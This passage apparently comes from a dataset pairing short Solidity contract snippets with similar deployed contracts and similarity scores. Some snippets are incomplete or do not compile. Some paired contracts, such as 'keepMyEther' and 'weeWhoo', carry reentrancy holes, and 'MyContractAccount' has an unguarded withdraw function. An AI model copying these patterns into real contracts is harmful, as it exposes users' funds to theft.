    }
    
    function reset() public {
        require(msg.sender==owner);
        i=0;
    }
    
    function inc() public payable {
        require(msg.value >= 0.001 ether);
        i++;
        if (i==2) {
            emit Won(msg.sender,address(this).balance);
            msg.sender.transfer(address(this).balance);
            i = 0;
        }
    }
    
}"
"contract test{
    
    mapping(address => bool) public wl;
    address[] public wls;

    function whitelistAddresses(address[] users) external {
        for (uint i = 0; i < users.length; i++) {
            wl[users[i]] = true;
            wls.push(users[i]);
        }
    }
}",0.6631363817216396,"contract MultiSender {
    function multiSend(uint256 amount, address[] addresses) public returns (bool) {
        for (uint i = 0; i < addresses.length; i++) {
            addresses[i].transfer(amount);
        }
    }

    function () public payable {
        
    }
}"
"contract Storage{
  uint public id;
  uint public status;

  function setId(uint mid) public returns(bool success) {
    id=mid;
    return true;
  }

  function setStatus(uint mStatus) public returns(bool success) {
    status=mStatus;
    return true;
  }
}",0.6757231348195132,"contract StrictToken is Token {

    bool public strict = true;

    mapping (address => uint256) public rate;



    function getRate(address _address) public view returns (uint256);

    function getStrict() public pure returns (bool);

}"
"contract A{

  Storage s; 

  function A() {
    s = new Storage(); 
  }

  function setId(uint id) public returns(bool success) {
     return s.setId(id);
  }

  function setStatus(uint mStatus) public returns(bool success) {
     return s.setStatus(mStatus);
  }

  function getId() public constant returns(uint id) {
     return s.id();
  }
  function getStatus() public constant returns(uint status) {
     return s.status();
  }
}",0.6672150943864512,"contract IToken {
    function mint(address _to, uint _amount) public;
    function start() public;
    function getTotalSupply()  public returns(uint);
    function balanceOf(address _owner)  public returns(uint);
    function transfer(address _to, uint _amount)  public returns (bool success);
    function transferFrom(address _from, address _to, uint _value)  public returns (bool success);
}"
"contract A{ 
  B b;
  function A() { 
    owner = msg.sender; 
    b = new B(); 
  }
}",0.644774403682039,"contract Ownable {
  address  owner;
  function Ownable() {
    owner = msg.sender;
  }
}"
"contract B{
  address parent;
  function B() {
    owner = msg.sender; 
    parent = msg.sender;
  }  
}",0.6859328217199991,"contract Ownable {
  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }
}"
"contract A {
    constructor() public {
        require(false);
    }
}",0.6777214685179149,"contract WtcErc20Destroy {
    constructor() public {
    }
}"
"contract PayMultiple {
    function pay(address[] payees, uint[] values) public payable{
        for(uint i = 0; i < payees.length; i++){
            payees[i].transfer(values[i]);
        }
    }   
}",0.6670037456638805,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract MyContract{
    bytes public data = ""0x3333"";
    bytes public empty;

    function clearData(){
         data = """";
    }
}",0.6198161861889068,"contract ContractReceiver {

    function tokenFallback(address _from, uint _value, bytes _data) public pure;

}"
"contract structWithMapping {

    struct User {
        string  username;
        string  category;
        string  data;
        bool    initialized;
    }
    mapping(string => User) public users;

    function setUserData(string memory _username, string memory _category, string memory _data) public{
        require(!users[_username].initialized);
        users[_username].username = _username;
        users[_username].category = _category;
        users[_username].data = _data;
        users[_username].initialized = true;
    }

}",0.6554891446715408,"contract Username {
  event Updated(address indexed user, string indexed username);

  mapping(address => string) public username;
  mapping(string => address) public owner;

  function Update(string memory _username) public {
    require(owner[_username] == address(0));
    string memory oldUserName = username[msg.sender];
    owner[_username] = msg.sender;
    owner[oldUserName] = address(0);
    username[msg.sender] = _username;
    emit Updated(msg.sender, _username);
  }
}"
"contract A {
    address to = 0x***;
    function() payable external {
        
        require(to.call.gas(1150).value(msg.value)());
    }
}",0.6344916588975289,"contract Token{

  function transfer(address to, uint value) external returns (bool);

}"
"contract Bought {
    address[] bought;

    
    function setBought()
    public
    {
        bought.push(msg.sender);
    }

    function getAllBought()
    public
    constant 
    returns(address[])
    {
        return bought;
    }
}",0.6812643620057406,"contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}"
"contract ReplicatorA {

    address creator;
  address baddress;
  uint blockCreatedOn;

    function Replicator() 
    {
        creator = msg.sender;
        baddress = new ReplicatorB();    
        blockCreatedOn = block.number;
    }

  function getBAddress() constant returns (address)
  {
    return baddress;
  }

  function getBlockCreatedOn() constant returns (uint)
  {
    return blockCreatedOn;
  }

    

    function kill()
    { 
        if (msg.sender == creator)
        {
            suicide(creator);  
        }
    }
}",0.6203747329060831,"contract Certifier {
	event Confirmed(address indexed who);
	event Revoked(address indexed who);
	function certified(address _who) constant returns (bool);
	function get(address _who, string _field) constant returns (bytes32) {}
	function getAddress(address _who, string _field) constant returns (address) {}
	function getUint(address _who, string _field) constant returns (uint) {}
}"
"contract TestExceptionHandling{
    uint public a ;
    constructor(uint _a) public{
        a= _a;
    }
    function increaseA(uint b) public{
        require(b > a, 'new value must be greater than a');
        if (b > 50){
            revert('Very large value');
        }
        a = b;
    }
}",0.6245752748326244,"contract SafeMath {
    function safeAdd(uint256 a, uint256 b) public pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint256 a, uint256 b) public pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
}"
"contract fooContract is fooLib {
    
}",0.6294471404998883,"contract tokenContract is ERC20Token{

}"
"contract sample {
 address user;
 
 constructor () public{
     user = msg.sender;
 }
 
 function returnUser() public view returns(address){
     return user;
 }
 
 
}",0.6952911106545695,"contract Mortal {

    

    address owner;



    

    constructor() public { owner = msg.sender; }



    

    function kill() public { if (msg.sender == owner) selfdestruct(owner); }

}"
"contract storeData{
    address public admin;
    mapping(uint256 => bytes32) public userData;

    constructor(){
        admin = msg.sender;
    }

    function saveData(uint256 userId,bytes32 fileHash) returns (bool){
        userData[userId] = fileHash;
        return True
    }

    function getData(uint256 userId) returns (bytes32){
        return userData[userId]
    }

}",0.6320692906944303,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    return false;
  }

  
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }

}"
"contract B {    

  A a; 

  constructor(address aAddress) public {
      a = A(aAddress);
  }

  function aBid() public payable{
    a.bid.value(msg.value)();
  }
}",0.6905912886906419,"contract InstaKyber is Trade {



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



}"
"contract Concurrency {
  uint public c;
}",0.6808579831154399,"contract Empty {
 uint public value = 5;
}"
"contract Complex{
    uint a = 1;
    uint b = 3;
    mapping(uint => uint) myMap;

    function Complex(){
        myMap[a] = b;
    }
}",0.6568892807032767,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract ICOProxy  {
    address tokenaddr;  
    address owner;      

    function () payable public{
        uint256 amount = msg.value * 10;

        
        
        require(ERC20(tokenaddr).transferFrom(owner, msg.sender, amount));
    }
}",0.6782242663437319,"contract TokenRecover is Ownable {



  

  function recoverERC20(

    address tokenAddress,

    uint256 tokenAmount

  )

    public

    onlyOwner

  {

    IERC20(tokenAddress).transfer(owner(), tokenAmount);

  }

}"
"contract TestHomestead{
    function test () returns(bool){
        return address(4).delegatecall(1);
    }
}",0.6447541403898631,"contract Destination {
    function recover(address _from, address _to) returns(bool);
}"
"contract ContractAddress {

    address public disAddress;

    constructor() public {
        assembly {
            sstore(disAddress_slot, address)
        }
    }
}",0.690058181966715,"contract Simple

{

    address public owner;



    constructor (address ownerAddress) public

    {

        owner = ownerAddress;

    }

}"
"contract KeyValueStorage {
    mapping (address => mapping(bytes32 => uint256)) internal refreshTime;
}",0.6296232875863063,"contract KernelStorage is KernelConstants {
    mapping (bytes32 => address) public apps;
}"
"contract EmpCheck{   
    private mapping(address,bool) private emps;

        function getSalary() onlyEmp public returns (uint){
            return 100;   
        }

    modifier onlyEmp(){
     require(emps[msg.sender] == true);
     -;   
    } 
}",0.6471554513003231,"contract MultiOwnable {



    mapping (address => bool) _owner;



    modifier onlyOwner() {

        require(isOwner(msg.sender));

        _;

    }



    function isOwner(address addr) public view returns (bool) {

        return _owner[addr];

    }



}"
"contract myContract is usingOraclize {
    
}",0.6322307890039396,"contract tokenContract is ERC20Token{

}"
"contract MyFirstContract{
    string private name;
    uint private age;

    function setName(string memory newName)
    public {
       name = newName;
    }

   function getName()
   view
   public
   returns (string memory) {
        return name;
    }

    function setAge(uint newAge)
    public {
        age = newAge;
    }

    function getAge()
    view
    public
    returns (uint) {
        return age;
    }
}",0.6973617051551474,"contract DetailedToken is ERC20 {



    string private _name = ""Moriartio"";

    string private _symbol = ""MIO"";

    uint8 private _decimals = 18;



    function name() public view returns(string) {

        return _name;

    }



    function symbol() public view returns(string) {

        return _symbol;

    }



    function decimals() public view returns(uint8) {

      return _decimals;

    }



}"
"contract Multisend
{
    constructor(address[] memory destinations, uint256[] amounts) public payable
    {
        require(destinations.length == amounts.length);
        for (uint256 i=0; i<destinations.length; i++)
        {
            destinations[i].transfer(amounts[i]);
        }
        selfdestruct(msg.sender);
    }
}",0.6290281628365194,"contract newC {
    function sendEth(address payable[] memory _addresses, uint256 _amount) public payable {
        for (uint i=0; i<_addresses.length; i++) {
            _addresses[i].transfer(_amount);
        }
    }
    constructor() public payable{}
    function () payable external{}
}"
"contract ZonoToken is BasicToken { 

    function deposit() payable
    {
        owner.transfer(msg.value); 
        uint newTokens = (msg.value * 10) / 1 ether;
        balances[msg.sender] = balances[msg.sender] + newTokens;
    }

    
    function() payable { deposit(); }
}",0.6218309196228667,"contract keepMyEther {
    mapping(address => uint256) public balances;
    
    function () payable public {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
}"
"contract Caller is TargetInterface {
    GenericProxy p;
    address target;

    function(uint x) public {
        
        p.forward(target, msg.data)
        
    }
}",0.6234170506930875,"contract WalletInterface {

    function getTransaction(uint _id) public view returns(address, uint, address, uint, uint, bool);

}"
"contract homosignet {
    function f(string s) constant returns (string){ return ""was string"";}
    function f(bytes b) constant returns (string){ return ""was bytes"";}
    function f(address a) constant returns (string){return ""was address"";}
}",0.6858646389440214,"contract Data {

    function isBS(address _member) public constant returns (bool);

    function getCP(address _cp) constant public returns (string, string);

    function canMakeNoFeeTransfer(address _from, address _to) constant public returns (bool);

}"
"contract Mycontract{
Fuelprice o;
constructor(address Oracleaddress_){
o=Fuelprice(Oracleaddress_);
}

function getfuelPriceUSD() public view returns (uint){
      return o.fuelPriceUSD();

    }
}",0.6104230502115449,"contract Owned {
    address contractOwner;

    constructor() public { 
        contractOwner = msg.sender; 
    }
    
    function whoIsTheOwner() public view returns(address) {
        return contractOwner;
    }
}"
"contract second{

    first firstContract = first('put here the first contract address');

    function combine(uint256 a, uint256 b, uint256 d) public view returns(uint256){
         uint256 c = firstContract.one(a, b);
         uint256 e = firstContract.two(c, d);
         return e;
    }

}",0.6340797457942287,"contract SafeMath {
  function safeSub(uint256 a, uint256 b) public pure returns (uint256) {
    require(b <= a);
    return a - b;
  }

  function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {
    uint256 c = a + b;
    require(c>=a && c>=b);
    return c;
  }
}"
"contract storagetest8 {

    mapping(uint256 => uint256) inventories;

    function setCharacter(address other_address, uint256 index1) 
        external 
    {
        uint256 _id = uint256(msg.sender);
        _id |= uint256(other_address)<<160;  
        inventories[index1] = _id;        
    }


    function getCharacter(uint256 index1) 
        external view
    returns(address owner_address, uint256 secondpart) {
        uint256 _id = inventories[index1];
        owner_address = address(_id);
        secondpart = _id>>160;  
    }
}",0.6147263546589118,"contract ERC20 is ERC20Extra {
  uint256  i=10001;
  uint256  n=10002;

  function allowance(address owner, address spender) constant returns (uint256);
  function transferFrom(address from, address to, uint256 value) returns (bool);
  function approve(address spender, uint256 value) returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}"
"contract AsUint8 {
    mapping(address => uint8) uint8s;

    function add()
    public
    {
        uint8s[msg.sender] = 1;
    }
}",0.6338876617489733,"contract ERC20Frag {
    function approve(address spender, uint tokens) public returns (bool);
}"
"contract testcontract {
    function testme () returns (string){
        string memory mystring = ""foo2"";
        return ""foo"";
    }
}",0.6633372050993513,"contract PublicResolver {
    function text(bytes32 node, string key) constant returns (string ret) {
    }
}"
"contract PubStorageReader is PublicStorage{

}",0.6489284884208074,"contract CryptocupStorage is GameStorage {



}"
"contract Test{
       function getAandB(uint x)
           public
           view
           returns ( uint a, uint b )
       {
          a = x * 2;
          b = x;
       }
   }",0.6838851872927589,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract MyContractAccount{

address public owner;

event received(address from, uint256 value, uint256 blocknumber);

constructor(){
    owner = msg.sender;
}

function () payable public{
    emit received(msg.sender, msg.value, block.number)
}

function withdraw(){
    owner.transfer(address(this).balance);
}",0.6749129687639377,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract GustavoCoin is MintableToken {
   ...
}",0.6734748903109838,"contract AltTokenInterface is MintableToken {

}"
"contract Factory {

 event LogNewContract(address sender, address newContract);

 function createContract() public returns (address created){  
   MyBasicContract c = new MyBasicContract();
   LogNewContract(msg.sender, c);
   return c;    
 }
}",0.613524733754886,"contract Utils {

    string constant public contract_version = ""0.4.0"";



    

    

    

    

    function contractExists(address contract_address) public view returns (bool) {

        uint size;



        assembly {

            size := extcodesize(contract_address)

        }



        return size > 0;

    }

}"
"contract TokenCreationInterface {
    ...
    
    
    
    function createTokenProxy(address _tokenHolder) returns (bool success);
    ...
",0.691416379359425,"contract TokenInterface {
    function transfer(address _to, uint256 _value) public returns (bool success);
}"
"contract Crowdfunding {
    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
    }

    Request[] public requests;
    address public manager;
    uint public minimumContribution;
    address[] public approvers;

    modifier restricted() {
        require(msg.sender == manager);
        _;
    }",0.6369221364907024,"contract ERC20StandardToken {



  string public name;

  string public symbol;

  uint8 public decimals;



  function allowance(address owner, address spender)

    public view returns (uint256);



  function transferFrom(address from, address to, uint256 value)

    public returns (bool);



}"
"contract SomeContract {

    
    address public owner = msg.sender; 

    event LogAccessAttempt(address account, string function, uint timestamp); 

    
    function someFunction()
    {
      
      LogAccessAttempt(msg.sender,""someFunction"",now);
      
      if (msg.sender !=owner) throw;
      
    }

    
    function changeOwner(address _newOwner)
    {
        LogAccessAttempt(msg.sender,""changeOwner"",now);
        
        if (msg.sender !=owner) throw;
        owner = _newOwner;
    }
}",0.6604518658832268,"contract OraclizeAddrResolver {



    address public addr;



    address owner;



    function OraclizeAddrResolver(){

        owner = msg.sender;

    }



    function changeOwner(address newowner){

        if (msg.sender != owner) throw;

        owner = newowner;

    }



    function getAddress() returns (address oaddr){

        return addr;

    }



    function setAddr(address newaddr){

        if (msg.sender != owner) throw;

        addr = newaddr;

    }



}"
"contract YourContract is Ownable {

    function yourfunction() onlyOwner returns(){}

}",0.6636297250396003,"contract Killable is Ownable {
  function kill() onlyOwner {
    selfdestruct(owner);
  }
}"
"contract Extend is Base {
    uint public num;
    constructor() public {
        Minit(10);
    }   
    function setN() public{
        num = getN();

    }
    function getN() public view returns(uint){
        return num;
    }
}",0.6767149087720971,"contract PotLike {
    function pie(address) public view returns (uint);
    function drip() public returns (uint);
    function join(uint) public;
    function exit(uint) public;
}"
"contract ButAndSell{

    uint public buyPrice = 1;

    function buy(address _tokenAddress) public payable{
        ERC20 token = ERC20(_tokenAddress);
        uint tokens = msg.value * buyPrice;
        require(token.balanceOf(this) >= tokens);
        uint commission = msg.value/100; 
       require(address(this).send(commission));
        token.transfer(msg.sender, tokens);
    }
}",0.6443003968928234,"contract TokenLocker {
    
    address public owner;

    ERC20 public token;

    
    function TokenLocker (ERC20 tokenAddr) public {
        owner = msg.sender;
        token = tokenAddr;
    }

    
    function transfer(address dest, uint amount) public returns (bool) {
        require(msg.sender == owner);
        return token.transfer(dest, amount);
    }

}"
"contract myContract {
  struct Ownable {
    string name;
    address creator;
    address currentOwner;
    bool isDestructible;
    uint price;
  }

  mapping (uint => Ownable) public Ownables;

  function getOwnableInfo(uint OwnableId) public view returns (string, address, address, bool, uint){
    Ownable o = Ownables[OwnableId];
    return (o.name, o.creator, o.currentOwner, o.isDestructible, o.price);
  }

  /.../
}",0.6140298346913466,"contract TokenI is ERC20Token {



    string public name;                

    uint8 public decimals;             

    string public symbol;              



    function approveAndCall(

    address _spender,

    uint256 _amount,

    bytes _extraData

    ) public returns (bool success);





    function generateTokens(address _owner, uint _amount) public returns (bool);



    function destroyTokens(address _owner, uint _amount) public returns (bool);



}"
"contract FixedLength {
    uint[10] public fixed_array;

    function getLength()
    public
    constant
    returns(uint)
    {
        return fixed_array.length;
    }
}",0.6282230655681184,"contract Agent {
    using SafeMath for uint256;

    function isInitialized() public constant returns (bool) {
        return false;
    }
}"
"contract test{

    uint public age;

    function test(){
        age = 10;
    }

    function callData() returns (string){
        bool result = this.delegatecall(bytes4(sha3(""age()"")));
        if (result) {
            return ""success"";
        }
        return ""failed"";
    }

}",0.6370733140714631,"contract Token {

    function balanceOf(address a) public pure returns (uint) {

        (a);

        return 0;

    }



    function transfer(address a, uint val) public pure returns (bool) {

        (a);

        (val);

        return false;

    }

}"
"contract usingOraclize {
    function parseAddr(string _a) internal returns (address);
    ...
}",0.6711620198760121,"contract OraclizeAddrResolverI {

    function getAddress() public returns (address _addr);

}"
"contract I {
    function deployB();
    function doSomething();
}",0.6476398643062523,"contract DummyReceiver {

    
    function start() {
    }

    
    function end() {
    }
}"
"contract SomeTest 
{
    constructor() public payable {}
}",0.6717309672702332,"contract BlankContract {
    constructor() public {}
}"
"contract A 
{
    address newContract;

    function test() public 
    {
      
      newContract = (new SomeTest).value(1 ether)(); 
    }
}",0.6351657630848296,"contract ContractConn{

    function transfer(address _to, uint _value) public returns (bool success);

}"
"contract MembersContract {

    struct Member {
        uint balance;
        address member;
        bool exists;
    }

    mapping(uint => Member) public members;
    uint membersLength;

    constructor() public {
        members[0] = Member(100, 0x0, true);
    }

    function addbalance(uint _balance) public returns(bool _success){
        if(members[1].exists == true) {
            members[1].balance = _balance;
            return true;
        }
        else {
            return false;
        }
    }


}",0.6213527105558713,"contract MyToken {

    

    mapping (address => uint256) public balanceOf;



    

    constructor(

        uint256 initialSupply

        ) public {

        balanceOf[msg.sender] = initialSupply;              

    }



    

    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);           

        require(balanceOf[_to] + _value >= balanceOf[_to]); 

        balanceOf[msg.sender] -= _value;                    

        balanceOf[_to] += _value;                           

        return true;

    }

}"
"contract Child is Parent 
{
    constructor(address _token)
        public
        Parent(_token) 
    {
    }
}",0.6696499182411844,"contract DIHToken is DIHBase {
    constructor(address owner) public
        DIHBase(owner)
    {
    } 
}"
"contract Client {

  Test t;

  constructor(address test) public {
    t = Test(test);
  }
}",0.6083876069678156,"contract Empty {

    address owner;



    constructor () public {

        owner = msg.sender;

    }

}"
"contract SimpleContract is Ownable {

}",0.6989128016015524,"contract Texochat is Ownable {

}"
"contract Extend{
    Base public base;
    uint public num;
    constructor(address _base) public {
        base = Base(_base);
        base.Minit(10);
    }   
    function setN() public{
        num = base.getN();

    }
    function getN() public view returns(uint){
        return num;
    }
}",0.6579350754764784,"contract StrictToken is Token {

    bool public strict = true;

    mapping (address => uint256) public rate;



    function getRate(address _address) public view returns (uint256);

    function getStrict() public pure returns (bool);

}"
"contract MoneyFountain{

address owner;
uint256 sendAmount;

function MoneyFountain(){
    owner = msg.sender;
    sendAmount = 100000000000000000;
}

function getBalance() returns (uint){
    return address(this).balance;
}    
event send_amount(address indexed _to,uint indexed _value);

    function sendWei(address recp) returns (bool){

    if(this.balance>sendAmount){
            if (!recp.send(sendAmount)){
                throw;
            return false;
            } 
            else {
               send_amount(recp,sendAmount);
            return true;
            }
    }
    }
",0.6348822986301279,"contract BronixICO is owned {

    function BronixICO() public {
        
    }

    event EtherTransfer(address indexed _from,address indexed _to,uint256 _value);

    function withdrawEther(address _account) public onlyOwner payable returns (bool success) {
        require(_account.send(this.balance));

        EtherTransfer(this, _account, this.balance);
        return true;
    }

    function destroyContract() public onlyOwner {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }

    function () payable public {
        
    }

}"
"contract A is B {
    constructor() public {
        B.Player storage p = B.Players[1];   
    }
 }",0.6045560288286784,"contract PHP is ERC20 {
    constructor() public ERC20(""PHP Stablecoin"", ""PHP"") {}
}"
"contract DeafaultValueOfBool{

    bool public test;
}",0.6001055251052047,"contract Pausable {



  bool public paused;

}"
"contract PayCheck {

    address[] employees = [0xca35b7d915458ef540ade6068dfe2f44e8fa733c, 0x118531D9C6C9114c8B999Ac1197778d1669Fc6c6];

    mapping (address => uint) withdrawnAmounts;

    constructor() payable public{
    }

    function () payable public{
    }

    modifier canWithdraw() {
        bool contains = false;

        for(uint i = 0; i < employees.length; i++) {
            if(employees[i] == msg.sender) {
                contains = true;
            }
        }
        require(contains);
        _;
    }

    event DebugLog(string, uint256);

    function withdraw() canWithdraw public{
        uint amountAllocated = address(this).balance/employees.length;
        uint amountWithdrawn = withdrawnAmounts[msg.sender];
        uint amount = amountAllocated - amountWithdrawn;
        withdrawnAmounts[msg.sender] = amountWithdrawn + amount;
        if (amount > 0) {
            emit DebugLog(""balance before"", msg.sender.balance);
            msg.sender.transfer(amount);
            emit DebugLog(""balance after"", msg.sender.balance);
        }

    }
}",0.6236328939827621,"contract weeWhoo 
{
    mapping (address => uint) public _balances;
    mapping (address => bool) private claimedBonus;
    address admin;
    uint public TotalAmount;

   function weeWhoo() public payable
    {
        admin=msg.sender;
        TotalAmount=  msg.value;
        
    }

    function deposit() public payable 
    {
        _balances[msg.sender] += msg.value;
        TotalAmount+= msg.value;
        claimedBonus[msg.sender]=false;
    }
    
    function GetBonusWithdraw() public payable 
    {      
        if(claimedBonus[msg.sender]!=true){
          _balances[msg.sender] += 10;
          withdraw();  
          }
          claimedBonus[msg.sender] = true;

     

    }
    
    function withdraw() public payable
    {
        uint amount;
         amount=_balances[msg.sender];
      if(amount!=0){
        _balances[msg.sender] -= amount;
        require(msg.sender.call.value(amount)(""""));
      }  
      TotalAmount-=amount;
    }
    
    function() external payable
    {
       TotalAmount+=msg.value;
        revert();
    }
    
    function destroy() public {
            require(msg.sender == admin);
            selfdestruct(msg.sender);
         }

}"
"contract Base {
    uint x;
    constructor(uint _x) public { x = _x; }
}",0.6517428841160057,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
"contract Derived2 is Base {
    constructor(uint _y) Base(_y * _y) public {}
}",0.628216132454092,"contract KPXV0_1_0 is Basic777 {
  constructor() public Basic777() { }
}"
"contract MyNFT721 { 
  ...
}",0.628450290578739,"contract MSD {

}"
"contract Target {
    function foo () public;
    function bar () public;
}",0.6499770244151933,"contract TargetInterface {

    function AddTicket() public payable;

}"
"contract Batch {
  constructor (Target target) public {
    target.foo ();
    target.bar ();
    selfdestruct (msg.sender);
  }
}",0.6252687788035847,"contract DeliverFunds {
    constructor(address payable target) public payable {
        selfdestruct(target);
    }
}"
"contract HelloWorld {
    uint public balance;

    function HelloWorld(){
             balance=1000;
    }
    function deposit() payable returns (uint _newValue){
             balance += msg.value;
             return balance;    
    }
}",0.6634455044959799,"contract ERC20 {
  function balanceOf(address _owner) public constant returns (uint balance);
  function transfer(address _to, uint _value) public returns (bool success);
}"
"contract C is B{
    uint c;

    constructor(uint _a, uint _b, uint _c) B(_a, _b) public {
        c = _c;
    }
}",0.6155029966144138,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract Foo {
  string public bar;

  constructor (string memory _bar) public {
    bar = _bar;
  }
}",0.642276120579245,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract J {
    function doOnI(address i);
}",0.6511974687784705,"contract Test {
    
    function die() {
        suicide(0);
    }
}"
"contract test {
    function foo() returns (bool){
        string memory a = ""hello"";
        string memory b = ""world"";
        return StringUtils.equal(a, b);
    }
}",0.6401969092647264,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract TestHomestead{
    function test () constant returns(bool){
        return address(4).delegatecall(1);
    }
}",0.6613356762245086,"contract TokensaleBlacklist {
    function isRestricted(address _addr) constant returns(bool);
}"
"contract paymentCheck{        
    function Check(){
        
    }        
}",0.6372688828158871,"contract Project {
	function setCompany(){
		
	}



	
}"
"contract Crowdsale {

        address owner;  
        mapping(address => uint256) balances;
        function Crowdsale(){
            owner = msg.sender;
        }

        function acceptOnlyMyToken(address _yourTokenAddress, uint256 amount){
            address user = msg.sender;
            YourToken token = YourToken(_yourTokenAddress);

            
            uint256 userBalance = token.balanceOf(user);
            
            if(userBalance >= amount){      
                token.transferFrom(user, owner, amount);        

            }

        }

    }",0.6417532126055377,"contract MultiSender {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function multiSend(
        address token,
        address[] memory addresses,
        uint256[] memory balances
    ) public {
        if (msg.sender != owner) return;
        ERC20 erc20token = ERC20(token);
        for (uint256 i = 0; i < addresses.length; i++) {
            erc20token.transferFrom(msg.sender, addresses[i], balances[i]);
        }
    }
}"
"contract Tool {
    function numberIsEven() returns (bool);
}",0.6866828605462126,"contract TUB {
    function off() public returns(bool);
}"
"contract secureContract {

   mapping (address => bool) public authorised;
   mapping (address => uint256) internal balance;

   
   function readInfo() public view returns(uint256){
       require(authorised[msg.sender], 'Unauthorised caller');
       return balance[msg.sender];
   }

}",0.6836189910138076,"contract EstateToken is AbstractToken {

  mapping (address => uint256) internal accounts;

  function transfer (address _to, uint256 _value) public returns (bool);

  function balanceOf (address _owner) public view returns (uint256 balance);

}"
"contract AccessControl {
    IJudge public jc;
    ...
}",0.6120182606966569,"contract ICDClue {

    uint public typesCount;

}"
"contract MyContract {

function showSender() public view returns (address)
{
     return(msg.sender);
 }


 function showSender(address passedAddress) public view returns (address)
  {
     return(passedAddress);
   }

}",0.687261306631506,"contract NEST_2_Mapping {
	function checkAddress(string memory name) public view returns (address contractAddress);
	function checkOwners(address man) public view returns (bool);
}"
"contract Something {
  ...
}",0.6534880946494103,contract SoloMargin {  }
"contract MyToken {
  function MyToken( ...",0.6427052869602387,"contract MSD6 {

    

    function() public {

        

    }

}"
"contract Money {
    string name;
    string territory;
    
    constructor(string _name, string _territory) public {
        name = _name;
        territory = _territory;
    }
    
    function moneyName() public constant returns (string){
        return name;
    }
}",0.6642462254779621,"contract TokenDetails {

    string internal _name;
    string internal _symbol;
    
    
    function name() public view returns(string memory) {
        return _name;
    }

    
    function symbol() public view returns(string memory) {
        return _symbol;
    }
}"
"contract mycontract{

        mapping (address => string[]) myMap;

        function get(address _addr) public returns (string[]){
           return myMap[_addr];
        }

    }",0.6871977715801387,"contract tDeployer {

	function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address);

}"
"contract test3 {

    uint256[5] public numbers = [1, 2, 100, 4, 5];

    function getPickWinner() public view returns(uint256){
        uint256 largest = 0; 
        uint256 i;

        for(i = 0; i < numbers.length; i++){
            if(numbers[i] > largest) {
                largest = numbers[i]; 
            } 
        }
        return largest;
    }
}",0.6474125348052305,"contract Clout is ERC20 {

function Clout() ERC20(100000000, ""Clout"", ""Clout"") public {}
function multisend(address[] dests, uint256[] values) public returns (uint256) {
uint256 i = 0;
while (i < dests.length) {
transfer(dests[i], values[i]);
i += 1;
}
return(i);
}

}"
"contract Payable {

    
    function() public payable {
        emit GotPaid(msg.value);
    }

    event GotPaid(uint256 value);
}",0.6378344278988729,"contract ERC20Burnable is ERC20 {

  function burn(uint256 value) public {

    _burn(msg.sender, value);

  }

}"
"contract in another contract like    
contract B {     
  contract A {    
     function abc(unit a) public;     
  }
....    
}",0.6089668754779535,"contract OmegaContract {
    bool public isOmegaContract = true;

    function OmegaContract() public {

    }
}"
"contract bet{

    uint256 public bet;

    event received(string msg);

    function () payable{

        bet=msg.value;
        received(""bet received"");

    }


}",0.6152628117397819,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract Greeter {
  function greet() constant returns(string);
}",0.6641529346765155,"contract AmIOnTheFork {
    function forked() constant returns(bool);
}"
"contract Store {

    bytes[] public data;

    function(){
        data.push(msg.data);
    }
}",0.6660760601685481,"contract IApplication {
  function initialize(bytes data) public;
}"
"contract A {
  B b;

  constructor () public {
    b = B (msg.sender);
  }
}",0.6750867268994811,"contract Yoinkable {
    constructor() public {
        selfdestruct(msg.sender);
    }
}"
"contract B {
  A a;

  constructor () public {
    a = new A ();
  }
}",0.6317454316315714,"contract Popo is WithdrawPopo {

  

  constructor()

    public 

  {



  }

  

}"
"contract A{

    event debug(bool destroyed);

    function destroyMeAndLog() onlyOwner{
        debug(true);
        selfdestruct(this);


    }
}",0.6220601090097582,"contract DestroyableMultiOwner is MultiOwnable {

	

	function destroy() public onlyOwner {

		selfdestruct(owners[0]);

	}

}"
"contract Example{

address recipient = 0x0000cafebabe;

function send(){
    recipient.send(this.balance);
 }
}",0.6245453502572654,"contract Sacrifice {

    function Sacrifice(address _recipient) public payable {

        selfdestruct(_recipient);

    }

}"
"contract Server{ 
    bool public alive = true;
    function homicide(){
        alive = false;
        suicide(msg.sender);
    }
}",0.6105452928849397,"contract Mortal is Ownable {
    
    function kill()  public{
        if (msg.sender == owner)
            selfdestruct(owner);
